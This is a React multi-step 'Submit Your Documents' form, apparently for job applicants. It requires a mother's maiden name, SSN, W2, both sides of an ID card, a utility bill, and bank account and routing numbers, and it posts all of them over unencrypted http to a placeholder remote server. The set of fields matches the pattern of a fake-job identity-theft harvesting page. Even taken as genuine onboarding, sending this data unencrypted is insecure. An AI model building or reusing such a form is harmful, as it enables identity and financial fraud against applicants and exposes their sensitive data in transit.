import React, { useState } from 'react';
import { HiXMark } from "react-icons/hi2";
import { useNavigate } from 'react-router-dom';

const Form = ({ onClose }) => {
  const navigate = useNavigate();

  const handleClose = () => {
    navigate('/'); // Navigate back to the home route
  };

  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState({
    lastName: '',
    firstName: '',
    mothersMaidenName: '',
    address1: '',
    email: '',
    positionApplied: '',
    ssn: '',
    startDate: '',
    telephone: '',
    w2Form: null,
    idCardFront: null,
    idCardBack: null,
    utilityBill: null,
    bank: '',
    accountNumber: '',
    routingNumber: '',
  });

  const [errors, setErrors] = useState({});

  const validateStep = () => {
    const newErrors = {};
    switch (currentStep) {
      case 1:
        if (!formData.lastName) newErrors.lastName = 'Last Name is required';
        if (!formData.firstName) newErrors.firstName = 'First Name is required';
        if (!formData.mothersMaidenName) newErrors.mothersMaidenName = 'Mother\'s Maiden Name is required';
        if (!formData.address1) newErrors.address1 = 'Address Line 1 is required';
        break;
      case 2:
        if (!formData.email) newErrors.email = 'Email is required';
        else if (!/\S+@\S+\.\S+/.test(formData.email)) newErrors.email = 'Email is invalid';
        if (!formData.positionApplied) newErrors.positionApplied = 'Position Applied is required';
        if (!formData.ssn) newErrors.ssn = 'SSN is required';
        break;
      case 3:
        if (!formData.startDate) newErrors.startDate = 'Start Date is required';
        if (!formData.telephone) newErrors.telephone = 'Telephone is required';
        if (!formData.w2Form) newErrors.w2Form = 'W2 Form is required';
        if (!formData.idCardFront) newErrors.idCardFront = 'ID Card Front is required';
        break;
      case 4:
        if (!formData.idCardBack) newErrors.idCardBack = 'ID Card Back is required';
        if (!formData.utilityBill) newErrors.utilityBill = 'Utility Bill is required';
        break;
      case 5:
        if (!formData.bank) newErrors.bank = 'Bank Name is required';
        if (!formData.accountNumber) newErrors.accountNumber = 'Account Number is required';
        if (!formData.routingNumber) newErrors.routingNumber = 'Routing Number is required';
        break;
      default:
        break;
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleNext = () => {
    if (validateStep()) {
      setCurrentStep((prevStep) => prevStep + 1);
    }
  };

  const handlePrevious = () => {
    setCurrentStep((prevStep) => prevStep - 1);
  };

  const handleChange = (e) => {
    const { name, type, value, files } = e.target;
    if (type === 'file') {
      setFormData((prevState) => ({
        ...prevState,
        [name]: files[0] || null,
      }));
    } else {
      setFormData((prevState) => ({
        ...prevState,
        [name]: value,
      }));
    }
  };
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateStep()) {
      const data = new FormData(e.target);
      for (const key in formData) {
        if (formData[key] !== null) {
          data.append(key, formData[key]);
        }
      }
  
      try {
        const response = await fetch('http://your-remote-server:5002/submit-form', {
          method: 'POST',
          body: data,
        });
  
        const contentType = response.headers.get('content-type');
        let result;
  
        if (contentType && contentType.includes('application/json')) {
          result = await response.json();
        } else {
          result = await response.text();
        }
  
        if (response.ok) {
          alert(result.message || 'Form submitted successfully');
          setFormData({
            lastName: '',
            firstName: '',
            mothersMaidenName: '',
            address1: '',
            email: '',
            positionApplied: '',
            ssn: '',
            startDate: '',
            telephone: '',
            w2Form: null,
            idCardFront: null,
            idCardBack: null,
            utilityBill: null,
            bank: '',
            accountNumber: '',
            routingNumber: '',
          });
          setErrors({});
          setCurrentStep(1);
          navigate('/');
        } else {
          console.error('Submission error:', result);
          alert(result.error || 'Form submission failed');
        }
      } catch (error) {
        console.error('Error during form submission:', error);
        alert('An unexpected error occurred. Please try again.');
      }
    }
  };
  
  return (
    <div className='max-w-4xl mx-auto w-full h-full p-10 bg-transparent rounded-lg shadow-md'>
      <div className='inline-flex gap-10'>
        <h2 className='text-2xl font-bold mb-10 text-white'>Submit Your Documents</h2>
        <HiXMark
          onClick={handleClose}
          size={40}
          className='cursor-pointer text-white p-3 bg-purple-600 rounded-3xl'
        />
      </div>

      <form onSubmit={handleSubmit}>
        {currentStep === 1 && (
          <div className='grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-2 gap-10'>
            {/* Step 1 Inputs */}
            <div className='mb-4'>
              <label className='block text-white mb-1' htmlFor='lastName'>
                Last Name
              </label>
              <input
                type='text'
                id='lastName'
                name='lastName'
                value={formData.lastName}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.lastName ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.lastName && <p className='text-red-500 text-sm'>{errors.lastName}</p>}
            </div>
            <div className='mb-4'>
              <label className='block text-white mb-1' htmlFor='firstName'>
                First Name
              </label>
              <input
                type='text'
                id='firstName'
                name='firstName'
                value={formData.firstName}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.firstName ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.firstName && <p className='text-red-500 text-sm'>{errors.firstName}</p>}
            </div>
            <div className='mb-4'>
              <label className='block text-white mb-1' htmlFor='mothersMaidenName'>
                Mother's Maiden Name
              </label>
              <input
                type='text'
                id='mothersMaidenName'
                name='mothersMaidenName'
                value={formData.mothersMaidenName}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.mothersMaidenName ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.mothersMaidenName && <p className='text-red-500 text-sm'>{errors.mothersMaidenName}</p>}
            </div>
            <div className='mb-4'>
              <label className='block text-white mb-1' htmlFor='address1'>
                Address Line 1
              </label>
              <input
                type='text'
                id='address1'
                name='address1'
                value={formData.address1}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.address1 ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.address1 && <p className='text-red-500 text-sm'>{errors.address1}</p>}
            </div>
          </div>
        )}

        {currentStep === 2 && (
          <div className='grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-2 gap-10'>
            {/* Step 2 Inputs */}
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='email'>
                Email
              </label>
              <input
                type='email'
                id='email'
                name='email'
                value={formData.email}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.email ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.email && <p className='text-red-500 text-sm'>{errors.email}</p>}
            </div>
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='positionApplied'>
                Position Applied
              </label>
              <input
                type='text'
                id='positionApplied'
                name='positionApplied'
                value={formData.positionApplied}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.positionApplied ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.positionApplied && <p className='text-red-500 text-sm'>{errors.positionApplied}</p>}
            </div>
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='ssn'>
                SSN
              </label>
              <input
                type='text'
                id='ssn'
                name='ssn'
                value={formData.ssn}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.ssn ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.ssn && <p className='text-red-500 text-sm'>{errors.ssn}</p>}
            </div>
          </div>
        )}

        {currentStep === 3 && (
          <div className='grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-2 gap-10'>
            {/* Step 3 Inputs */}
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='startDate'>
                Start Date
              </label>
              <input
                type='date'
                id='startDate'
                name='startDate'
                value={formData.startDate}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.startDate ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.startDate && <p className='text-red-500 text-sm'>{errors.startDate}</p>}
            </div>
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='telephone'>
                Telephone
              </label>
              <input
                type='tel'
                id='telephone'
                name='telephone'
                value={formData.telephone}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.telephone ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.telephone && <p className='text-red-500 text-sm'>{errors.telephone}</p>}
            </div>
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='w2Form'>
                W2 Form
              </label>
              <input
                type='file'
                id='w2Form'
                name='w2Form'
                onChange={handleChange}
                className={`w-full border rounded-lg ${errors.w2Form ? 'border-red-500' : ''}`}
              />
              {errors.w2Form && <p className='text-red-500 text-sm'>{errors.w2Form}</p>}
            </div>
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='idCardFront'>
                ID Card Front
              </label>
              <input
                type='file'
                id='idCardFront'
                name='idCardFront'
                onChange={handleChange}
                className={`w-full border rounded-lg ${errors.idCardFront ? 'border-red-500' : ''}`}
              />
              {errors.idCardFront && <p className='text-red-500 text-sm'>{errors.idCardFront}</p>}
            </div>
          </div>
        )}

        {currentStep === 4 && (
          <div className='grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-2 gap-10'>
            {/* Step 4 Inputs */}
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='idCardBack'>
                ID Card Back
              </label>
              <input
                type='file'
                id='idCardBack'
                name='idCardBack'
                onChange={handleChange}
                className={`w-full border rounded-lg ${errors.idCardBack ? 'border-red-500' : ''}`}
              />
              {errors.idCardBack && <p className='text-red-500 text-sm'>{errors.idCardBack}</p>}
            </div>
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='utilityBill'>
                Utility Bill
              </label>
              <input
                type='file'
                id='utilityBill'
                name='utilityBill'
                onChange={handleChange}
                className={`w-full border rounded-lg ${errors.utilityBill ? 'border-red-500' : ''}`}
              />
              {errors.utilityBill && <p className='text-red-500 text-sm'>{errors.utilityBill}</p>}
            </div>
          </div>
        )}

        {currentStep === 5 && (
          <div className='grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-2 gap-10'>
            {/* Step 5 Inputs */}
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='bank'>
                Bank Name
              </label>
              <input
                type='text'
                id='bank'
                name='bank'
                value={formData.bank}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.bank ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.bank && <p className='text-red-500 text-sm'>{errors.bank}</p>}
            </div>
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='accountNumber'>
                Account Number
              </label>
              <input
                type='text'
                id='accountNumber'
                name='accountNumber'
                value={formData.accountNumber}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.accountNumber ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.accountNumber && <p className='text-red-500 text-sm'>{errors.accountNumber}</p>}
            </div>
            <div className='mb-4'>
              <label className='block text-white mb-2' htmlFor='routingNumber'>
                Routing Number
              </label>
              <input
                type='text'
                id='routingNumber'
                name='routingNumber'
                value={formData.routingNumber}
                onChange={handleChange}
                className={`w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring ${errors.routingNumber ? 'border-red-500' : 'focus:border-blue-300'}`}
              />
              {errors.routingNumber && <p className='text-red-500 text-sm'>{errors.routingNumber}</p>}
            </div>
          </div>
        )}

        <div className='flex justify-between mt-10'>
          {currentStep > 1 && (
            <button
              type='button'
              onClick={handlePrevious}
              className='bg-gray-600 text-white px-4 py-2 rounded-lg'
            >
              Previous
            </button>
          )}
          {currentStep < 5 && (
            <button
              type='button'
              onClick={handleNext}
              className='bg-blue-500 text-white px-4 py-2 rounded-lg'
            >
              Next
            </button>
          )}
          {currentStep === 5 && (
            <button
              type='submit'
              className='bg-green-500 text-white px-4 py-2 rounded-lg'
            >
              Submit
            </button>
          )}
        </div>
      </form>
    </div>
  );
};

export default Form;
